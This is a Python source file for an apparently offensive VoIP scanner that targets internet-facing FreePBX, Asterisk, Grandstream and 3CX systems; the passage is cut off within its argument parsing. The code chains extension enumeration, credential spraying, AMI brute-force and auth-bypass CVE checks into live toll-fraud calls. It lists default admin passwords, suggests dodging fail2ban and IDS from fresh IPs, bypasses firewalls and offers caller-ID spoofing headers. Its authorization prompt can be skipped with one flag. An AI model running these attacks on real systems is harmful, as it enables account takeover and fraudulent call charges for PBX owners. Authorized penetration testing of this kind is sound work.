#!/usr/bin/env python3.12
"""voip_scan.py — VoIP penetration testing scanner.

Tuned for FreePBX / Asterisk / Grandstream / 3CX engagements on internet-
facing targets. One CLI, one HTML report, one job: prove the toll-fraud risk.

ONE-CLICK FULL AUDIT (--auto):
  voip_scan.py --target <IP> --auto --call-to <YOUR_NUMBER> --i-have-authorization

STANDARD FULL AUDIT:
  voip_scan.py --target <IP> --full --call-test --call-to <YOUR_NUMBER>

USE ONLY ON SYSTEMS YOU OWN OR ARE EXPLICITLY AUTHORISED TO TEST.
"""
from __future__ import annotations

import argparse
import getpass
import os
import random
import re
import socket
import subprocess
import sys
import time
from dataclasses import asdict

from scanner import ami, auth, call, discovery, enumeration, http_probes, report
from scanner.utils import Colours, Progress, TrafficLog, hash_file

try:
    from scanner import cve as cve_module
    _CVE_AVAILABLE = True
except ImportError:
    cve_module = None  # type: ignore[assignment]
    _CVE_AVAILABLE = False

try:
    from scanner import crack as crack_module
    _CRACK_AVAILABLE = True
except ImportError:
    crack_module = None  # type: ignore[assignment]
    _CRACK_AVAILABLE = False

# Mode preset definitions
_MODE_PRESETS: dict[str, dict] = {
    "fast": {
        "rate": 100.0, "timeout": 1.5, "workers": 64,
        "desc": "aggressive speed (rate=100, timeout=1.5s, workers=64)",
    },
    "standard": {
        "rate": 50.0, "timeout": 3.0, "workers": 32,
        "desc": "balanced defaults (rate=50, timeout=3s, workers=32)",
    },
    "stealth": {
        "rate": 5.0, "timeout": 5.0, "workers": 4,
        "desc": "low-and-slow (rate=5, timeout=5s, workers=4)",
    },
}

BANNER = r"""
  __      __   ___ ____    ____
  \ \    / /__|_ _|  _ \  / ___|  ___ __ _ _ __  _ __   ___ _ __
   \ \  / / _ \| || |_) | \___ \ / __/ _` | '_ \| '_ \ / _ \ '__|
    \ \/ / (_) | ||  __/   ___) | (_| (_| | | | | | | |  __/ |
     \__/ \___/___|_|     |____/ \___\__,_|_| |_|_| |_|\___|_|

  v4.0 — FreePBX / Asterisk / Grandstream / 3CX  |  Elite Auto-Mode
"""

# ---------------------------------------------------------------------------
# Terminal helpers (all accept a Colours instance; safe when col.* == "")
# ---------------------------------------------------------------------------

def _phase(label: str, col: Colours) -> None:
    w = 62
    print(f"\n{col.BOLD}{col.CYAN}{'─' * w}")
    print(f"  {label}")
    print(f"{'─' * w}{col.RESET}")


def _ok(msg: str, col: Colours) -> None:
    print(f"  {col.GREEN}[+]{col.RESET} {msg}")


def _warn(msg: str, col: Colours) -> None:
    print(f"  {col.YELLOW}[!]{col.RESET} {msg}")


def _info(msg: str, col: Colours) -> None:
    print(f"  {col.CYAN}[*]{col.RESET} {msg}")


def _err(msg: str, col: Colours) -> None:
    print(f"  {col.RED}[X]{col.RESET} {msg}")


def _finding(sev: str, msg: str, col: Colours) -> None:
    tag = f"[{sev.upper():8}]"
    print(f"  {col.for_severity(sev)}{tag}{col.RESET} {msg}")


def _jitter_sleep(jitter: float) -> None:
    """Sleep for a random duration between 0 and jitter seconds."""
    if jitter > 0.0:
        time.sleep(random.uniform(0.0, jitter))


# ---------------------------------------------------------------------------
# Adaptive scan state — single mutable object shared across all phases
# for one host.  Two live-updating pools drive inter-phase chaining:
#   EXTENSION_LIST  — every confirmed extension (deduped, ordered by confidence)
#   CRACK_POOL      — passwords to try first in spray, ordered by hit-probability
# ---------------------------------------------------------------------------

from dataclasses import dataclass as _dc, field as _field


@_dc
class ScanState:
    """Mutable scan context for a single host.

    Populated incrementally as phases run; downstream phases read the
    current state rather than re-discovering information.
    """
    ip: str
    fingerprint: str = ""

    # Open port list from discovery
    open_ports: list[dict] = _field(default_factory=list)

    # SIP connection parameters (patched in place on auto-recovery)
    sip: dict | None = None
    sip_port: int = 5060
    sip_tcp: bool = False
    sip_tls: bool = False

    # ── Live-updating pools ───────────────────────────────────────────────
    # All known extensions, deduplicated.  Each entry is a dict with at
    # minimum keys: extension, auth_required, anonymous_invite, open_register,
    # source ("enum" | "ami_dump" | "synthetic").
    extension_list: list[dict] = _field(default_factory=list)

    # Passwords to promote to the front of every spray run.
    # Ordered: AMI password first, then SIP-cracked, then hash-cracked.
    crack_pool: list[str] = _field(default_factory=list)

    # Extensions whose credentials have already been confirmed — skip re-spray.
    confirmed_exts: set[str] = _field(default_factory=set)

    # ── Phase outputs (mirror of the old hr dict keys) ────────────────────
    http_findings: list[dict] = _field(default_factory=list)
    cve_findings: list[dict] = _field(default_factory=list)
    cve_auth_bypass_triggered: bool = False   # True when an auth-bypass CVE confirmed
    ami: dict | None = None
    ami_http: dict | None = None
    credentials_found: list[dict] = _field(default_factory=list)
    cracked_credentials: list[dict] = _field(default_factory=list)  # from hash cracking
    call_test: dict | None = None
    subscribe_probes: list[dict] = _field(default_factory=list)
    refer_probe: dict | None = None

    def add_extensions(self, exts: list[str], source: str = "enum") -> int:
        """Add new extensions to extension_list (deduplicated).

        Returns the number of net-new extensions added.
        """
        existing = {e["extension"] for e in self.extension_list}
        added = 0
        for ext in exts:
            if ext not in existing:
                self.extension_list.append({
                    "extension": ext,
                    "auth_required": True,
                    "anonymous_invite": False,
                    "open_register": False,
                    "source": source,
                })
                existing.add(ext)
                added += 1
        return added

    def add_to_crack_pool(self, passwords: list[str]) -> int:
        """Prepend new passwords to crack_pool (deduplicated, preserving order).

        Returns the number of net-new passwords added.
        """
        existing = set(self.crack_pool)
        added = 0
        new_pw: list[str] = []
        for pw in passwords:
            if pw and pw not in existing:
                new_pw.append(pw)
                existing.add(pw)
                added += 1
        # Prepend so callers see highest-confidence passwords first
        self.crack_pool = new_pw + self.crack_pool
        return added

    def spray_targets(self) -> list[str]:
        """Return extension strings that still need spraying."""
        return [
            e["extension"] for e in self.extension_list
            if e.get("auth_required") and e["extension"] not in self.confirmed_exts
        ]

    def to_host_report(self) -> dict:
        """Convert to the legacy hr dict consumed by report.write_all()."""
        return {
            "ip": self.ip,
            "open_ports": self.open_ports,
            "sip": self.sip,
            "fingerprint": self.fingerprint,
            "extensions": self.extension_list,
            "credentials_found": self.credentials_found,
            "http_findings": self.http_findings,
            "cve_findings": self.cve_findings,
            "ami": self.ami,
            "ami_http": self.ami_http,
            "call_test": self.call_test,
            "subscribe_probes": self.subscribe_probes,
            "refer_probe": self.refer_probe,
        }


# CVE IDs whose confirmation should trigger deeper authentication attacks
# even when no extensions were enumerated.
_AUTH_BYPASS_CVES: frozenset[str] = frozenset({
    "CVE-2025-66039",   # FreePBX webserver auth bypass
    "CVE-2023-37315",   # Grandstream auth bypass
    "CVE-2019-19006",   # FreePBX unauthenticated admin
    "CVE-2021-37748",   # Grandstream UCM RCE (implicit auth bypass)
})


# ---------------------------------------------------------------------------
# External tool detection & NAT/firewall bypass helpers
# ---------------------------------------------------------------------------

_EXT_TOOLS: dict[str, str | None] = {}  # populated at scan start


def _detect_external_tools() -> dict[str, str | None]:
    """Probe for external security tools and return {name: path_or_None}."""
    probes = [
        "socat", "ncat", "nc", "nmap", "sipsak",
        "sngrep", "tcpdump", "tshark", "sipdump", "sipvicious",
        "hashcat", "john", "hydra",
    ]
    tools: dict[str, str | None] = {}
    for t in probes:
        try:
            r = subprocess.run(["which", t], capture_output=True, text=True, timeout=3)
            tools[t] = r.stdout.strip() if r.returncode == 0 else None
        except Exception:
            tools[t] = None
    return tools


def _nat_auto_recover(
    host: str,
    current_source_ip: str,
    timeout: float,
    col: "Colours",
) -> str | None:
    """If source_ip is RFC-1918 and host is public, resolve public IP via STUN.

    Returns the public IP string on success, None if STUN fails or not needed.
    """
    import ipaddress

    def _is_private(ip: str) -> bool:
        try:
            return ipaddress.ip_address(ip).is_private
        except ValueError:
            return False

    def _is_public(ip: str) -> bool:
        try:
            a = ipaddress.ip_address(ip)
            return not (a.is_private or a.is_loopback or a.is_link_local)
        except ValueError:
            return False

    if not _is_private(current_source_ip) or not _is_public(host):
        return None  # no NAT mismatch

    try:
        from scanner.stun import resolve_public_ip
        pub = resolve_public_ip(timeout=timeout)
        if pub and pub != current_source_ip:
            _ok(
                f"AUTO-NAT-FIX: STUN resolved public IP {col.BOLD}{pub}{col.RESET} "
                f"(was {current_source_ip}) — patching SIP Contact/Via headers…",
                col,
            )
            return pub
    except Exception:
        pass
    return None


def _show_ext_tool_hint(
    hint: str,
    tools: dict[str, str | None],
    col: "Colours",
) -> None:
    """Print one-liner if the relevant external tool is available."""
    # hint keys: "socat", "nmap", "sngrep", etc.
    for tool, path in tools.items():
        if tool in hint.lower() and path:
            print(f"  {col.CYAN}  ↳ [{tool}] {hint}{col.RESET}")
            return


# ---------------------------------------------------------------------------
# SIP no-response deep diagnostics
# ---------------------------------------------------------------------------

_SIP_ALT_PROBE_PORTS: list[tuple[str, int, str, bool]] = [
    # (transport, port, label, use_tls)
    ("UDP",  5060, "SIP/UDP standard",       False),
    ("UDP",  5080, "SIP/UDP alt (some PBX)", False),
    ("UDP",  5090, "SIP/UDP alt",            False),
    ("UDP",  5160, "SIP/UDP alt (3CX)",      False),
    ("TCP",  5060, "SIP/TCP standard",       False),
    ("TCP",  5061, "SIP/TLS standard",       True),
    ("TCP",  5080, "SIP/TCP 5080",           False),
    ("TCP",  5090, "SIP/TCP 5090",           False),
    ("TCP",  5000, "SIP/TCP 3CX",            False),
    ("TCP",  5001, "SIP/TLS 3CX",            True),
    ("TCP",  5066, "SIP/WSS 5066",           True),
    ("TCP",  8088, "SIP/WS Asterisk HTTP",   False),
    ("TCP",  8089, "SIP/WSS Asterisk HTTPS", True),
]

# Maps open TCP port → what that service might be (for context hints)
_PORT_CONTEXT: dict[int, str] = {
    80:    "HTTP — likely FreePBX/Asterisk/3CX web admin panel",
    443:   "HTTPS — PBX admin panel (TLS). Try --port 443 + TLS probe",
    4443:  "HTTPS alt — common FreePBX admin HTTPS port",
    5038:  "Asterisk AMI (TCP) — management interface, not SIP",
    5066:  "SIP/WSS port — SIP-over-WebSocket (RFC 7118) may be present",
    8080:  "HTTP alt — Grandstream / Yeastar web admin",
    8088:  "Asterisk HTTP + SIP/WebSocket (RFC 7118). Try WS transport",
    8089:  "Asterisk HTTPS/WSS — encrypted WebSocket SIP",
    8443:  "HTTPS alt — PBX TLS admin or SIP/WSS",
    10000: "Asterisk RTP range start — signaling likely on UDP/5060",
    3478:  "STUN — confirms NAT/media relay infrastructure",
    3479:  "STUN alt port",
    5349:  "TURNS (STUN over TLS)",
}


def _sip_no_response_diagnosis(
    host: str,
    open_ports: list[dict],
    args_port: int,
    timeout: float,
    source_ip: str,
    col: "Colours",
) -> tuple[dict | None, int, bool, bool]:
    """Probe all alt SIP transports/ports and print a rich diagnostic.

    Returns (sip_dict, found_port, found_is_tcp, found_use_tls).
    sip_dict is None if nothing responded — otherwise it's a dict compatible
    with h.sip that the caller should assign so subsequent phases can run.
    """
    from scanner import sip as sip_mod

    tcp_open = {p["port"] for p in open_ports if p["proto"] == "tcp"}

    print()
    print(f"  {col.BOLD}{col.YELLOW}╔══ SIP REACHABILITY AUTO-PROBE  [{host}] ══╗{col.RESET}")
    print(f"  {col.YELLOW}║{col.RESET}  Probing {len(_SIP_ALT_PROBE_PORTS)} transport/port combinations…")
    print()

    # (transport_str, port, label, status, code_str, resp_obj)
    probe_results: list[tuple[str, int, str, str, str | None, object]] = []

    for transport, port, label, use_tls in _SIP_ALT_PROBE_PORTS:
        is_tcp = (transport in ("TCP", "TLS"))
        resp_obj = None
        # Skip TCP ports that aren't open (saves time / avoids noise)
        if is_tcp and port not in tcp_open:
            status = "CLOSED"
            code_str: str | None = None
        else:
            try:
                resp_obj = sip_mod.options_probe(
                    host, port=port,
                    local_ip=source_ip or None,
                    timeout=min(timeout, 2.0),
                    tcp=is_tcp,
                    use_tls=use_tls,
                )
                if resp_obj:
                    status = "OPEN"
                    code_str = f"{resp_obj.status_code} {resp_obj.reason[:40]}"
                else:
                    status = "NO-RESP"
                    code_str = None
            except Exception as exc:
                status = "ERR"
                code_str = str(exc)[:60]

        probe_results.append((transport, port, label, status, code_str, resp_obj))

        icon = (f"{col.GREEN}✓{col.RESET}" if status == "OPEN" else
                f"{col.RED}✗{col.RESET}" if status == "CLOSED" else
                f"{col.YELLOW}?{col.RESET}")
        code_display = f"  → {col.CYAN}{code_str}{col.RESET}" if code_str else ""
        print(f"    {icon} {label:<36} [{transport:3}/{port:<5}]  {status}{code_display}")

    print()

    # Context clues from open TCP ports
    if open_ports:
        print(f"  {col.BOLD}Open port context:{col.RESET}")
        for p in open_ports:
            hint = _PORT_CONTEXT.get(p["port"], "")
            hint_str = f"  → {hint}" if hint else ""
            print(f"    • {p['port']}/{p['proto']}  {p.get('service','')}{hint_str}")
        print()

    # Find any alt ports that responded
    open_alts = [(t, p, l, c, r) for t, p, l, s, c, r in probe_results if s == "OPEN"]

    # Build the discovered SIP dict from the first responding alt port
    discovered_sip: dict | None = None
    found_port = args_port
    found_is_tcp = False
    found_use_tls = False

    if open_alts:
        first_t, first_p, first_l, first_c, first_resp = open_alts[0]
        found_is_tcp = (first_t in ("TCP", "TLS"))
        found_use_tls = (first_t == "TLS")
        found_port = first_p
        transport_key = "tls" if found_use_tls else ("tcp" if found_is_tcp else "udp")
        realm = ""
        if first_resp and hasattr(first_resp, "auth_params"):
            realm = first_resp.auth_params.get("realm", "")
        discovered_sip = {
            "status": first_resp.status_code if first_resp else 0,
            "reason": first_resp.reason if first_resp else "",
            "server": first_resp.server if first_resp else "",
            "allow": [],
            "transport": transport_key,
            "realm": realm,
            "_auto_recovered_port": first_p,
            "_auto_recovered_transport": transport_key,
        }

    # Build actionable recommendations list
    recs: list[str] = []

    if open_alts:
        for t, p, l, c, _ in open_alts:
            flag = "--tcp" if t in ("TCP", "TLS") else ""
            if p == open_alts[0][1] and t == open_alts[0][0]:
                recs.append(
                    f"[AUTO-APPLIED] SIP found on {t}/{p}  ({l}  {c})\n"
                    f"       Tool auto-switched — all phases now resuming on {t}/{p}"
                )
            else:
                recs.append(
                    f"SIP also found on {t}/{p}  ({l}  {c})\n"
                    f"       Re-run with: {col.BOLD}--port {p}{' ' + flag if flag else ''}{col.RESET}"
                )
    else:
        recs.append(
            "Firewall or SIP-ALG likely dropping UDP/5060 packets.\n"
            "       Try from a different network (mobile hotspot vs same ISP).\n"
            "       Use: --mode stealth --timeout 10  (slower probes bypass some rate-limit rules).\n"
            "       UDP OPTIONS are sometimes blocked; TCP/TLS SIP may pass through enterprise FW."
        )

    # Web admin surface
    web_ports = tcp_open & {80, 443, 4443, 8080, 8443}
    if web_ports:
        recs.append(
            f"Web admin surface on TCP {sorted(web_ports)} — browse to http(s)://{host}/\n"
            f"       FreePBX: admin/admin  |  3CX: admin/<serial>  |  Grandstream: admin/admin\n"
            f"       Login may allow direct call routing rules without SIP"
        )

    # WebSocket SIP
    if 8088 in tcp_open or 8089 in tcp_open:
        recs.append(
            f"Asterisk WS/WSS SIP on 8088/8089 — SIP-over-WebSocket (RFC 7118)\n"
            f"       Try: {col.BOLD}--port 8088{col.RESET}  (WS)  or  {col.BOLD}--port 8089 --tcp{col.RESET}  (WSS)\n"
            f"       Inspect: http://{host}:8088/httpstatus"
        )

    # NAT / ISP SIP-ALG
    recs.append(
        "ISP SIP-ALG may rewrite/drop SIP packets.\n"
        "       Tunnel over TCP/443 (mimics HTTPS): --port 443 --tcp\n"
        "       Or use a VPN/proxy that bypasses SIP-ALG."
    )

    # AMI paths
    if 5038 in tcp_open:
        recs.append(
            f"Asterisk AMI open on TCP/5038 — add --ami-attack flag.\n"
            f"       AMI can originate calls without SIP at all (AMI 'originate' action)."
        )
    if 8088 in tcp_open:
        recs.append(
            f"Asterisk /rawman on 8088 — add --ami-attack flag.\n"
            f"       Also check: http://{host}:8088/httpstatus for exposed modules."
        )

    # IDS evasion
    recs.append(
        "Target may use fail2ban/IDS.\n"
        "       Wait 15+ min then retry from a fresh IP.\n"
        "       Use --mode stealth to stay below most IDS thresholds."
    )

    # Source port forcing
    recs.append(
        "Some PBXes only reply to SIP from privileged source ports.\n"
        "       Try: --source-port-range 5060-5060"
    )

    print(f"  {col.BOLD}Recommendations + auto-actions:{col.RESET}")
    for i, rec in enumerate(recs, 1):
        lines = rec.split("\n")
        prefix = f"{col.GREEN}★{col.RESET}" if "AUTO-APPLIED" in lines[0] else f"{col.YELLOW}{i}.{col.RESET}"
        print(f"    {prefix} {lines[0]}")
        for line in lines[1:]:
            print(f"       {line}")
    print()

    if not open_alts:
        print(f"  {col.RED}{col.BOLD}  No SIP on any probed transport — see recommendations above.{col.RESET}")
        print(f"  {col.YELLOW}  PBX may be firewalled, behind a SIP proxy, or unreachable from this network.{col.RESET}")
    else:
        print(f"  {col.GREEN}{col.BOLD}  AUTO-RECOVERY: switching to {open_alts[0][0]}/{open_alts[0][1]} "
              f"— resuming full scan now.{col.RESET}")

    print(f"  {col.BOLD}{col.YELLOW}╚{'═'*50}╝{col.RESET}")
    print()

    # Only run relay/nmap probes when nothing was found via the standard sweep
    if not open_alts:
        sip_port = args_port  # alias for the inserted block below

        # ── socat UDP→TCP relay: last-resort bypass when UDP 5060 blocked ────
        if _EXT_TOOLS.get("socat"):
            try:
                from scanner.nat import socat_tcp_relay
                _relay_port = 5073  # ephemeral local port for relay
                _relay_proc = socat_tcp_relay(host, target_port=sip_port,
                                              local_port=_relay_port, timeout=3.0)
                if _relay_proc:
                    # Probe localhost:_relay_port (socat relays to host:sip_port via TCP)
                    _relay_msg = sip_mod.build_message(
                        "OPTIONS", f"sip:{host}",
                        from_user="goldagent", to_user="goldagent",
                        host="127.0.0.1", port=_relay_port,
                        local_ip="127.0.0.1", local_port=0,
                    )
                    _relay_data = sip_mod.send_and_recv(_relay_msg, "127.0.0.1",
                                                    _relay_port, 0, timeout)
                    _relay_resp = sip_mod.parse_response(_relay_data) if _relay_data else None
                    _relay_proc.terminate()
                    if _relay_resp and _relay_resp.status_code in range(100, 700):
                        _ok(f"socat relay: UDP→TCP through relay — SIP {_relay_resp.status_code} "
                            f"{_relay_resp.reason} confirmed on {host}:{sip_port}", col)
                        # Return the ORIGINAL host/port — caller uses sip_mod.send_and_recv directly;
                        # the relay was just a probe. Set tcp=True so all subsequent sends use TCP.
                        return _relay_resp.to_dict() if hasattr(_relay_resp, "to_dict") else {
                            "status": _relay_resp.status_code,
                            "reason": _relay_resp.reason,
                            "server": _relay_resp.server or "",
                            "allow": list(_relay_resp.allow),
                            "transport": "tcp",
                        }, sip_port, True, False
            except Exception:
                pass

        # ── nmap firewall probe: detect filtered/open state via evasion flags ──
        if _EXT_TOOLS.get("nmap"):
            try:
                from scanner.nat import nmap_sip_probe
                _nm = nmap_sip_probe(host, port=sip_port, timeout=6.0)
                if _nm.get("open"):
                    _ok(f"nmap evasion probe: SIP port {sip_port}/udp is OPEN (firewall bypassed via --source-port 53)", col)
                    if _nm.get("scripts"):
                        _info(f"nmap SIP scripts: {_nm['scripts']}", col)
                elif _nm.get("filtered"):
                    _warn(f"nmap: port {sip_port}/udp is FILTERED — deep firewall detected. "
                          f"Try --tcp or VPN tunnel.", col)
            except Exception:
                pass

    return discovered_sip, found_port, found_is_tcp, found_use_tls


# ---------------------------------------------------------------------------
# SIP intel display helpers
# ---------------------------------------------------------------------------

def _show_sip_intel(intel: dict, col: "Colours") -> None:
    """Print structured SIP intelligence extracted from a single packet exchange."""
    if not intel:
        return
    sensitive = intel.get("sensitive_lines", [])
    versions = intel.get("platform_version", [])
    extensions = intel.get("extensions", [])
    internal_ips = intel.get("internal_ips", [])
    srtp_keys = intel.get("srtp_keys", [])
    methods = intel.get("allowed_methods", [])
    topology = intel.get("topology", [])
    identity = intel.get("identity_headers", [])
    custom = intel.get("custom_headers", [])

    if versions:
        for v in versions:
            _ok(f"[INTEL] Platform/version detected: {col.BOLD}{v}{col.RESET}", col)
    if methods:
        dangerous = {"REFER", "SUBSCRIBE", "NOTIFY", "MESSAGE", "PUBLISH"}
        flagged = [m for m in methods if m in dangerous]
        if flagged:
            _warn(f"[INTEL] Dangerous SIP methods advertised: {col.RED}{', '.join(flagged)}{col.RESET}", col)
    if internal_ips:
        for ip in internal_ips:
            _warn(f"[INTEL] Internal IP leaked in SIP headers: {col.RED}{ip}{col.RESET}", col)
    if extensions:
        for ext in extensions:
            _info(f"[INTEL] SIP extension/user discovered: {col.CYAN}{ext}{col.RESET}", col)
    if identity:
        for h in identity:
            _warn(f"[INTEL] Identity header exposed: {col.YELLOW}{h[:120]}{col.RESET}", col)
    if topology:
        for h in topology:
            _info(f"[INTEL] Routing topology: {h[:120]}", col)
    if custom:
        for h in custom:
            _info(f"[INTEL] Custom header: {h[:120]}", col)
    if srtp_keys:
        for k in srtp_keys:
            _err(f"[INTEL] SRTP KEY ON WIRE: {col.RED}{k[:120]}{col.RESET}", col)


def _show_cleartext_capture(ev: dict, col: "Colours") -> None:
    """Render the live cleartext SIP wire-capture demonstration in the terminal."""
    if not ev:
        return
    host = ev.get("host", "?")
    sip_port = ev.get("sip_port", 5060)

    print()
    print(f"  {col.BOLD}{col.RED}╔══ CLEARTEXT SIP WIRE CAPTURE  [{host}:{sip_port}] ══╗{col.RESET}")
    print(f"  {col.RED}║  Passive attacker on same network segment sees everything below:{col.RESET}")
    print(f"  {col.YELLOW}  tcpdump : {ev.get('tcpdump_cmd', '')}{col.RESET}")
    print(f"  {col.YELLOW}  sngrep  : {ev.get('sngrep_cmd', '')}{col.RESET}")
    print(f"  {col.YELLOW}  wireshark filter: {ev.get('wireshark_filter', '')}{col.RESET}")
    print()

    for pkt in ev.get("packets", []):
        direction = pkt.get("direction", "")
        label = pkt.get("label", "")
        content = pkt.get("content", "")
        hi_set = set(pkt.get("highlight_lines", []))

        arrow = (f"  {col.GREEN}▶ SENT{col.RESET} " if direction == "sent"
                 else f"  {col.RED}◀ RECV{col.RESET} ")
        print(f"{arrow}{col.BOLD}{label}{col.RESET}")
        print(f"  {'─' * 64}")

        for j, line in enumerate(content.splitlines()[:80]):
            ll = line.lower()
            if j in hi_set or any(kw in ll for kw in
                                   ("www-authenticate:", "proxy-authenticate:",
                                    "authorization:", "a=crypto:", "nonce=", "realm=")):
                print(f"  {col.RED}{col.BOLD}  ▶▶ {line}{col.RESET}")
            elif any(kw in ll for kw in ("server:", "user-agent:", "allow:",
                                          "p-asserted-identity:", "remote-party-id:")):
                print(f"  {col.YELLOW}  •  {line}{col.RESET}")
            elif any(kw in ll for kw in ("via:", "contact:", "record-route:",
                                          "from:", "to:")):
                print(f"  {col.CYAN}     {line}{col.RESET}")
            else:
                print(f"       {line}")
        print()

    # Aggregated intelligence summary
    agg = ev.get("aggregated", {})

    if agg.get("all_challenges"):
        print(f"  {col.BOLD}{col.RED}⚡ CAPTURED CREDENTIALS ON THE WIRE:{col.RESET}")
        for ch in agg["all_challenges"]:
            print(f"    Realm     : {col.RED}{ch.get('realm', '?')}{col.RESET}")
            print(f"    Nonce     : {col.RED}{ch.get('nonce', '?')}{col.RESET}")
            print(f"    Algorithm : {col.YELLOW}{ch.get('algorithm', 'MD5')}{col.RESET}  "
                  f"← MD5 = crackable offline in minutes with rockyou.txt")
        print()

    if ev.get("auth_demo"):
        print(f"  {col.BOLD}{col.RED}⚡ AUTHORIZATION HEADER (visible when user logs in):{col.RESET}")
        print(f"  {col.RED}  {ev['auth_demo'][:240]}{col.RESET}")
        print()

    if agg.get("all_srtp_keys") or ev.get("sdp_crypto_offered"):
        print(f"  {col.BOLD}{col.RED}⚡ SRTP KEY MATERIAL IN CLEARTEXT SDP:{col.RESET}")
        if ev.get("sdp_crypto_offered"):
            print(f"    Offered  : {col.RED}{ev['sdp_crypto_offered'][:120]}{col.RESET}")
        if ev.get("sdp_crypto_echoed"):
            print(f"    PBX echo : {col.RED}{ev['sdp_crypto_echoed'][:120]}{col.RESET}")
            print(f"    {col.BOLD}Both SRTP keys visible → SDES encryption is completely defeated.{col.RESET}")
        for k in agg.get("all_srtp_keys", []):
            print(f"    Captured : {col.RED}{k[:120]}{col.RESET}")
        print()

    if agg.get("all_internal_ips"):
        print(f"  {col.BOLD}{col.YELLOW}⚡ INTERNAL NETWORK TOPOLOGY LEAKED:{col.RESET}")
        for ip in agg["all_internal_ips"]:
            print(f"    RFC-1918 IP in SIP headers: {col.YELLOW}{ip}{col.RESET}  "
                  f"(pivot target for internal network)")
        print()

    if agg.get("all_extensions"):
        print(f"  {col.BOLD}{col.CYAN}⚡ EXTENSIONS/USERS DISCOVERED FROM SIP EXCHANGE:{col.RESET}")
        for ext in agg["all_extensions"]:
            print(f"    {col.CYAN}{ext}{col.RESET}")
        print()

    if agg.get("all_versions"):
        print(f"  {col.BOLD}⚡ PLATFORM VERSION FINGERPRINT:{col.RESET}")
        for v in agg["all_versions"]:
            print(f"    {col.YELLOW}{v}{col.RESET}")
        print()

    if ev.get("hashcat_cmd"):
        print(f"  {col.BOLD}Offline credential cracking (from captured pcap):{col.RESET}")
        for line in ev["hashcat_cmd"].splitlines():
            if line.strip().startswith("#"):
                print(f"  {col.YELLOW}{line}{col.RESET}")
            else:
                print(f"  {col.CYAN}$ {line}{col.RESET}")
        print()

    print(f"  {col.RED}{col.BOLD}╚═══ ALL ABOVE VISIBLE TO ANY PASSIVE NETWORK OBSERVER ═══╝{col.RESET}")
    print()


# ---------------------------------------------------------------------------
# Authorisation gate
# ---------------------------------------------------------------------------

def authorize(args, col: Colours) -> tuple[str, str | None]:
    """Returns (operator, scope_sha256 or None). Exits on refusal."""
    operator = args.operator or getpass.getuser()

    scope_hash = None
    if args.scope_file:
        if not os.path.exists(args.scope_file):
            print(f"ERROR: scope file not found: {args.scope_file}", file=sys.stderr)
            sys.exit(2)
        scope_hash = hash_file(args.scope_file)

    intrusive = any([args.enum, args.spray, args.call_test, args.full, args.ami_attack,
                     getattr(args, "auto", False)])
    if intrusive and not args.scope_file:
        if not args.i_have_authorization:
            print()
            print(f"{col.BOLD}AUTHORISATION REQUIRED{col.RESET}")
            print("─" * 60)
            print(f"  Operator       : {operator}")
            print(f"  Target         : {args.target}")
            print(f"  Scope file     : (none provided)")
            print(f"  Intrusive tests: {intrusive}")
            if args.call_test:
                print(f"  {col.RED}CALL PLACEMENT{col.RESET} : YES → {args.call_to} from {args.call_from or 'auto'}")
            print()
            print("I confirm I am authorised by the asset owner to perform this test,")
            print("and accept full responsibility for any impact to the target.")
            ans = input("Type 'yes' to proceed: ").strip().lower()
            if ans != "yes":
                print("Aborted.")
                sys.exit(1)

    return operator, scope_hash


# ---------------------------------------------------------------------------
# Argument parsing
# ---------------------------------------------------------------------------

def _validate_phone_number(val):
    import re as _re
    if not _re.match(r"^[+0-9*#pPwWx,;. -]{1,40}$", val.strip()):
        import argparse
        raise argparse.ArgumentTypeError("Invalid phone number format: " + repr(val))
    return val.strip()


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description=(
            "VoIP pentest scanner — full PBX audit in one command.\n"
            "Discovers, enumerates, cracks, and demonstrates toll-fraud on\n"
            "FreePBX / Asterisk / Grandstream internet-facing targets."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "ONE-CLICK FULL AUDIT:\n"
            "  %(prog)s --target 10.0.0.1 --auto --call-to +447900900900 --i-have-authorization\n\n"
            "Checks run with --auto / --full:\n"
            "  discovery · HTTP probes · CVE scan · AMI brute-force · Asterisk HTTP API\n"
            "  extension enumeration · credential spray · SRTP downgrade\n"
            "  CVE-2021-37748 (Grandstream) · FreePBX REST API · rawman\n\n"
            "Add --call-test --call-to <number> to demonstrate live toll fraud."
        ),
    )
    p.add_argument("--target", default="",
                   help="IP, CIDR, hostname, or file:hosts.txt")
    p.add_argument("--operator",
                   help="Name/handle of the operator (defaults to $USER)")
    p.add_argument("--scope-file",
                   help="Path to signed scope-of-work; SHA-256 logged")
    p.add_argument("--i-have-authorization", action="store_true",
                   help="Skip interactive auth prompt (still requires scope-file for record)")

    p.add_argument("--auto", action="store_true",
                   help="One-command full audit: enables --full + CVE scan + stealth "
                        "mode + STUN + AMI + prefix discovery. The most comprehensive "
                        "single flag. Add --call-to to also demonstrate live toll fraud. "
                        "Requires --i-have-authorization.")

    g = p.add_argument_group("Checks (default: discover only)")
    g.add_argument("--full", action="store_true",
                   help="Run all checks: enum + spray + ami-attack + HTTP probes + "
                        "CVE scan + Asterisk HTTP API. Automatically enables --stun "
                        "auto and --discover-prefix when --call-to is provided. "
                        "Alias for --auto.")
    g.add_argument("--enum", action="store_true",
                   help="Enumerate extensions via REGISTER+INVITE")
    g.add_argument("--ext-range",
                   help="Extension range: 1000-1099 | 100,200 | file:path "
                        "(auto-detected from fingerprint when --full)")
    g.add_argument("--ext-wordlist",
                   default=os.path.join(os.path.dirname(__file__),
                                        "wordlists/extensions.txt"))
    g.add_argument("--spray", action="store_true",
                   help="Spray default credentials against auth-required extensions")
    g.add_argument("--cred-file",
                   default=os.path.join(os.path.dirname(__file__),
                                        "wordlists/credentials.txt"))
    g.add_argument("--grandstream-creds", action="store_true",
                   help="Also try the Grandstream-specific credential list")
    g.add_argument("--ami-attack", action="store_true",
                   help="Brute-force AMI (TCP/5038) and Asterisk HTTP API with default credentials")

    c = p.add_argument_group("Toll-fraud call PoC")
    c.add_argument("--call-test", action="store_true",
                   help="Place a proof-of-concept outbound call")
    c.add_argument("--call-to",
                   type=_validate_phone_number,
                   help="Destination number (YOU must own it)")
    c.add_argument("--call-from",
                   help="From extension (defaults to first valid extension found)")
    c.add_argument("--call-dry-run", action="store_true",
                   help="Stop at provisional response (no 200 OK)")
    c.add_argument("--from-display",
                   help='Display name on From: header (e.g. "Unknown")')
    c.add_argument("--pai",
                   help="P-Asserted-Identity (e.g. sip:+14155550100@example.com)")
    c.add_argument("--diversion",
                   help="Diversion header (spoofed forward history)")
    c.add_argument("--privacy",
                   help="Privacy header — id|header|session|user|none|critical")
